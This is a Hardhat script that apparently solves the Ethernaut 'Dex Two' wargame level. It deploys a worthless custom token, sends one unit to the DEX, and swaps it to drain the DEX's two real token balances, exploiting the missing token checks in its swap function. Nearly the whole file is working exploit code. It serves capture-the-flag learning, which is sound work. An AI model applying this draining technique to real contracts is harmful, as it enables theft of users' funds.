import { ethers } from "hardhat";
import { DexTwo__factory } from "../typechain/factories/contracts/DexTwo.sol/DexTwo__factory";
import { SwappableTokenTwo__factory } from "../typechain/factories/contracts/DexTwo.sol/SwappableTokenTwo__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0x3Abcafd409410B18175213F6c4112775334dDBeF";
    let dexTwo = new DexTwo__factory(signer).attach(instance_address);
    let token1 = await dexTwo.token1();
    let token2 = await dexTwo.token2();
    console.log("dexTwo token1", await dexTwo.balanceOf(token1, instance_address));
    console.log("dexTwo token2", await dexTwo.balanceOf(token2, instance_address));
    console.log("player token1", await dexTwo.balanceOf(token1, signer.address));
    console.log("player token2", await dexTwo.balanceOf(token2, signer.address));


    let token3 = await new SwappableTokenTwo__factory(signer).deploy(instance_address, "Token 3", "TKN3", 1000);
    await token3.deployed();
    
    let tx = await dexTwo.approve(instance_address, 1000);
    await tx.wait();
    tx = await token3["approve(address,address,uint256)"](signer.address, instance_address, 1000);
    await tx.wait();

    tx = await token3.transfer(instance_address, 1);
    await tx.wait(); 

    tx = await dexTwo.swap(token3.address, token1, 1);
    await tx.wait();
    tx = await dexTwo.swap(token3.address, token2, 2);
    await tx.wait();

    console.log("dexTwo token1", await dexTwo.balanceOf(token1, instance_address));
    console.log("dexTwo token2", await dexTwo.balanceOf(token2, instance_address));
    console.log("player token1", await dexTwo.balanceOf(token1, signer.address));
    console.log("player token2", await dexTwo.balanceOf(token2, signer.address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
